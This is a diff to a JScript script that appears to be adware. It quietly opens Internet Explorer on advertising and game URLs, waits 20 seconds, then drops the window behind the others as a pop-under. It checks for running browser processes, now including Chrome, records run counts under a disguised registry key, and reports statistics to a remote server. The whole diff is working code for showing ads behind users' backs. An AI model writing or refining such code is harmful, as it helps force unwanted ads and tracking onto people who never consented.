@@ -1,7 +1,7 @@
 var title1="http://mgtdf.bfxg400.com/?xz"
 var title2="http://www.mygame66.com/211930021.html?placeid="
 var __title = ""
-
+var currenttaskid = __currenttaskid
 var pid = __external.GetPID();
 var tpid = pid.substr(15,1)
 var statkey = ""
@@ -13,16 +13,17 @@ if ("8"<=tpid){
 	statkey = "mygame66"
 }
 
-var taskid = 30002
+var taskid = currenttaskid
+ 
 if (  !FindExeInBlacklist() || GetTaskXRunTimes(taskid)){
 	exit(4000+1)
 	sendHttpStat("openurl", "t_"+taskid+"_exit" ,  1);  
 }
 else{
-	CreateIEObject()
+	CreateBottomIEByUrl(__title)
 	sendHttpStat("openurl", "t_"+taskid+"_" + statkey ,  1);  
 	SetTaskXRunTimeXX(taskid)
-	exit(4000)
+	
 }
 function GetTaskXRunTimes(taskid){
 	var regvalue = __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\trt_"+taskid)} );
@@ -49,14 +50,14 @@ function FindWindow (title){//模糊查找窗口标题
 			if(t.indexOf(s)>=0){				 
 				log("exist wnd " + text + " will exit() ;")
 				//alert("findwindow : " + text);
-				find=1
+				find=hwnd
 				return 0;
 			}		
 	}); 
 	return find	
 }
 function FindExeInBlacklist(){
-	var blacklist=["iexplore", "liebao"]; //"Firefox","chrome"
+	var blacklist=["iexplore", "liebao","chrome"]; //"Firefox","chrome"
 	//var wql="SELECT * FROM Win32_Process" + " where 0=1";
 	
 	var wql="SELECT * FROM Win32_Process" + " where Name='AAABBBCCCDDD'";
@@ -73,9 +74,27 @@ function FindExeInBlacklist(){
 		return false;
 	}	
 }
+function FindWindowByProcessID(processid,title){
+		if(!processid)
+			return 0;
+		var find=0;
+		var ret = __windows.EnumWindows(function(hwnd, text){		
+				var id = __windows.GetWindowThreadProcessId(hwnd);
+				//log("text : "+text+" , hwnd : " + hwnd+" , id : "+id);
+				if((processid==id) ){
+						if(text.indexOf(title)>=0){
+							log(" find window : "+" hwnd : "+hwnd+" text : "+text);
+							find = hwnd
+						return 1
+				 }
+				} 
+		});
+		return find; 
+}
 
 function CreateIEObject()
 {
+	
 	var __ie = new ActiveXObject ("internetexplorer.application");
 		var ie=__ie
 		with(ie)
@@ -99,5 +118,45 @@ function CreateIEObject()
 		ie.visible=1
 		} 
 }
-
+function CreateBottomIEByUrl(url)
+{
+	var processid = __external.ShellExcute("", ("C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE -new " + __title),"",1);
+	 
+	/*
+	var find=0;
+	var ret = __windows.EnumWindows(function(hwnd, text){		
+			var t = text.toLowerCase();
+			var s = title.toLowerCase();
+			if(t.indexOf(s)>=0){				 
+				log("exist wnd " + text + " will exit() ;")
+				//alert("findwindow : " + text);
+				find=1
+				return 0;
+			}		
+	}); 
+	 */ 
+	 //"拜迪蕾娜·红酒木瓜靓汤中国大陆唯一官方网站 请认准官网系列红酒木瓜靓汤"
+	 //"http://www.mygame66.com/211930021.html?placeid="
+	 var title=""
+	 if(statkey == "bfxg400"){
+	 	 title="拜迪蕾娜·红酒木瓜靓汤中国大陆唯一官方网站"
+	 }else{
+	   title="http://www.mygame66.com/211930021.html?placeid="
+	 }
+ 
+	 function show(){
+	 	 //  alert( " processid :  "+processid)
+		 var wnd = FindWindowByProcessID(processid,title);
+		 //alert( " processid :  "+processid+" wnd : "+wnd)
+		 if( wnd	 ){
+		    //__windows.ModifyStyleExByTitle(wnd,	0,0, 0x0040)
+		   // alert("弹出"+wnd)
+		    __windows.SetWindowPos(wnd, 1, 0,0,0,0, (1 | 2 | 4 |0x10|0x0040))
+		 }
+		 exit(4000)
+	 }
+	 
+	 setTimeout(function(){   show(); },20000);
+	 
+}
 
